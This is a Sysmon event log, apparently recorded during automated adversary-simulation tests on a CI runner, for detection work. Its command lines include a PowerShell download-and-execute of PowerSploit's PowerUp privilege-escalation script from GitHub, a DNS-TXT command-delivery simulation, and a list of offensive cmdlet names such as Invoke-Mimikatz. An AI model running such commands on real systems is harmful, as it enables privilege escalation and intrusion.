ImageLoaded: C:\Windows\Microsoft.NET\Framework\v4.0.30319\clr.dll
FileVersion: 4.8.9310.0 built by: NET481REL1LAST_C
Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
Product: Microsoft? .NET Framework
Company: Microsoft Corporation
OriginalFileName: clr.dll
Hashes: SHA256=3E10AA220D63BF5A29D7CA8423856D8993D469D9D74382309205505AEADFD0F8
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:53:46 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:53:46.958
ProcessGuid: {f995aebf-618a-6942-5d03-000000000e00}
ProcessId: 7688
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_vbunpt1x.jex.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:53:46 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:53:46.584
ProcessGuid: {f995aebf-618a-6942-5c03-000000000e00}
ProcessId: 2700
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-618a-6942-5b03-000000000e00}
ParentProcessId: 6176
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" . whoami
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:53:46 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:53:46.502
ProcessGuid: {f995aebf-618a-6942-5b03-000000000e00}
ProcessId: 6176
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_i14hqxyi.rf0.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:53:46 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:53:46.277
ProcessGuid: {f995aebf-618a-6942-5a03-000000000e00}
ProcessId: 8364
Image: C:\Windows\System32\nslookup.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: nslookup
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: nslookup.exe
CommandLine: ""C:\Windows\system32\nslookup.exe"" -q=txt example.com 8.8.8.8
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=72F2FBF04F12E5140D5B3505341C7022872E7B24FEBE9BFBDC37F09E5042D72C
ParentProcessGuid: {f995aebf-618a-6942-5803-000000000e00}
ParentProcessId: 6720
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""powershell.exe"" & {# creating a custom nslookup function that will indeed call nslookup but forces the result to be \""""whoami\""""
# this would not be part of a real attack but helpful for this simulation
function nslookup  { &\""""$env:windir\system32\nslookup.exe\"""" @args | Out-Null; @(\""""\"""",\""""whoami\"""")}
powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]}
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:53:46 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:53:46.172
ProcessGuid: {f995aebf-618a-6942-5803-000000000e00}
ProcessId: 6720
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_a1yyxzmq.n5j.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:53:44 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 07:53:44.380
ProcessGuid: {f995aebf-60ef-6942-1303-000000000e00}
ProcessId: 8084
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\NETWORK SERVICE"
"12/17/2025 7:51:53 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:51:51.273
ProcessGuid: {f995aebf-5a09-6942-3601-000000000e00}
ProcessId: 9576
QueryName: ocsp.digicert.com
QueryStatus: 0
QueryResults: type: 5 ocsp.edge.digicert.com;type: 5 cac-ocsp.digicert.com.edgekey.net;type: 5 e3913.cd.akamaiedge.net;::ffff:23.60.131.209;
Image: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpDefenderCoreService.exe
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:51:53 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:51:51.216
ProcessGuid: {f995aebf-5a09-6942-3601-000000000e00}
ProcessId: 9576
QueryName: mobile.events.data.microsoft.com
QueryStatus: 0
QueryResults: type: 5 mobile.events.data.trafficmanager.net;type: 5 onedscolprdcus06.centralus.cloudapp.azure.com;::ffff:13.89.179.8;
Image: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpDefenderCoreService.exe
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:51:47 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:51:46.357
ProcessGuid: {f995aebf-6110-6942-4303-000000000e00}
ProcessId: 8204
QueryName: localhost
QueryStatus: 0
QueryResults: 127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:51:46 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:51:44.579
ProcessGuid: {f995aebf-6110-6942-4303-000000000e00}
ProcessId: 8204
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.103
SourceHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
SourcePort: 51900
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.108.133
DestinationHostname: cdn-185-199-108-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:51:46 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:51:44.573
ProcessGuid: {f995aebf-6110-6942-4303-000000000e00}
ProcessId: 8204
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.108.133;::ffff:185.199.110.133;::ffff:185.199.109.133;::ffff:185.199.111.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:51:44 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:51:44.580
ProcessGuid: {f995aebf-6110-6942-4303-000000000e00}
ProcessId: 8204
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:51:44 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:51:44.348
ProcessGuid: {f995aebf-6110-6942-4303-000000000e00}
ProcessId: 8204
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_pfaa1c4g.uha.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:51:44 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:51:44.255
ProcessGuid: {f995aebf-6110-6942-4303-000000000e00}
ProcessId: 8204
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
Invoke-AllChecks}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:51:43 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:51:43.930
ProcessGuid: {f995aebf-610f-6942-4103-000000000e00}
ProcessId: 7956
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_awulycd2.vcc.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:51:43 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:51:43.836
ProcessGuid: {f995aebf-610f-6942-4103-000000000e00}
ProcessId: 7956
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$malcmdlets = \""""Add-Persistence\"""", \""""Find-AVSignature\"""", \""""Get-GPPAutologon\"""", \""""Get-GPPPassword\"""", \""""Get-HttpStatus\"""", \""""Get-Keystrokes\"""", \""""Get-SecurityPackages\"""", \""""Get-TimedScreenshot\"""", \""""Get-VaultCredential\"""", \""""Get-VolumeShadowCopy\"""", \""""Install-SSP\"""", \""""Invoke-CredentialInjection\"""", \""""Invoke-DllInjection\"""", \""""Invoke-Mimikatz\"""", \""""Invoke-NinjaCopy\"""", \""""Invoke-Portscan\"""", \""""Invoke-ReflectivePEInjection\"""", \""""Invoke-ReverseDnsLookup\"""", \""""Invoke-Shellcode\"""", \""""Invoke-TokenManipulation\"""", \""""Invoke-WmiCommand\"""", \""""Mount-VolumeShadowCopy\"""", \""""New-ElevatedPersistenceOption\"""", \""""New-UserPersistenceOption\"""", \""""New-VolumeShadowCopy\"""", \""""Out-CompressedDll\"""", \""""Out-EncodedCommand\"""", \""""Out-EncryptedScript\"""", \""""Out-Minidump\"""", \""""PowerUp\"""", \""""PowerView\"""", \""""Remove-Comments\"""", \""""Remove-VolumeShadowCopy\"""", \""""Set-CriticalProcess\"""", \""""Set-MasterBootRecord\""""

foreach ($cmdlets in $malcmdlets) {
    \""""function $cmdlets { Write-Host Pretending to invoke $cmdlets }\""""}
foreach ($cmdlets in $malcmdlets) {
    $cmdlets}}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:51:43 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:51:43.374
ProcessGuid: {f995aebf-610f-6942-4003-000000000e00}
ProcessId: 6532
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_gp0hafdg.4hy.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:51:42 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:51:42.762
ProcessGuid: {f995aebf-610e-6942-3c03-000000000e00}
ProcessId: 3420
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_553eb5uj.q22.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:51:42 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:51:42.666
ProcessGuid: {f995aebf-610e-6942-3c03-000000000e00}
ProcessId: 3420
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -UseEncodedArguments -EncodedArgumentsParamVariation EncodedArguments -Execute -ErrorAction Stop}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:51:42 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 07:51:42.338
ProcessGuid: {f995aebf-59f2-6942-c700-000000000e00}
ProcessId: 6956
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:51:42 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 07:51:42.337
ProcessGuid: {f995aebf-59f2-6942-c700-000000000e00}
ProcessId: 6956
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:51:42 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 07:51:42.336
ProcessGuid: {f995aebf-59f2-6942-c700-000000000e00}
ProcessId: 6956
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:51:42 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:51:42.181
ProcessGuid: {f995aebf-610e-6942-3a03-000000000e00}
ProcessId: 2064
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_jusgi20l.qip.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:51:42 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:51:42.084
ProcessGuid: {f995aebf-610e-6942-3a03-000000000e00}
ProcessId: 2064
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -Execute -ErrorAction Stop}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:51:41 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:51:41.599
ProcessGuid: {f995aebf-610d-6942-3803-000000000e00}
ProcessId: 5496
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_u2kvqiwp.vkt.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:51:41 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:51:41.504
ProcessGuid: {f995aebf-610d-6942-3803-000000000e00}
ProcessId: 5496
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -UseEncodedArguments -EncodedArgumentsParamVariation EA -Execute -ErrorAction Stop}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:51:41 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:51:41.029
ProcessGuid: {f995aebf-610c-6942-3603-000000000e00}
ProcessId: 7432
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_uecjs3bs.gvm.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:51:40 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:51:40.691
ProcessGuid: {f995aebf-6108-6942-3303-000000000e00}
ProcessId: 620
Image: C:\Windows\System32\wsmprovhost.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpClient.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: Client Interface
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: mpclient.dll
Hashes: SHA256=F1CA293E6D05A500EB026529A27948B01B6467D0E9C20C6049101C2B2829B96A
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:51:40 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:51:40.689
ProcessGuid: {f995aebf-6108-6942-3303-000000000e00}
ProcessId: 620
Image: C:\Windows\System32\wsmprovhost.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpOAV.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: IOfficeAntiVirus Module
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: MpOAV.dll
Hashes: SHA256=0EF8AE9CC8E3722C0AE09B55531BBA2F2A3422CCF4A1BB9B37ABDB4808AAC232
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:51:38 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:51:37.182
ProcessGuid: {f995aebf-6108-6942-3103-000000000e00}
ProcessId: 8432
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: true
SourceIp: fe80:0:0:0:f50a:6b8a:427d:ab03
SourceHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
SourcePort: 51898
SourcePortName: -
DestinationIsIpv6: true
DestinationIp: fe80:0:0:0:f50a:6b8a:427d:ab03
DestinationHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
DestinationPort: 5985
DestinationPortName: -"
"12/17/2025 7:51:38 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:51:37.044
ProcessGuid: {f995aebf-6108-6942-3103-000000000e00}
ProcessId: 8432
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: true
SourceIp: fe80:0:0:0:f50a:6b8a:427d:ab03
SourceHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
SourcePort: 51897
SourcePortName: -
DestinationIsIpv6: true
DestinationIp: fe80:0:0:0:f50a:6b8a:427d:ab03
DestinationHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
DestinationPort: 5985
DestinationPortName: -"
"12/17/2025 7:51:37 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:51:36.760
ProcessGuid: {f995aebf-6108-6942-3103-000000000e00}
ProcessId: 8432
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: true
SourceIp: fe80:0:0:0:f50a:6b8a:427d:ab03
SourceHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
SourcePort: 51896
SourcePortName: -
DestinationIsIpv6: true
DestinationIp: fe80:0:0:0:f50a:6b8a:427d:ab03
DestinationHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
DestinationPort: 5985
DestinationPortName: -"
"12/17/2025 7:51:37 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:51:36.758
ProcessGuid: {f995aebf-6108-6942-3103-000000000e00}
ProcessId: 8432
QueryName: runnervm8j6r3
QueryStatus: 0
QueryResults: fe80::f50a:6b8a:427d:ab03;fe80::5b03:f8d2:72e1:c92a;::ffff:10.1.0.103;::ffff:172.23.112.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
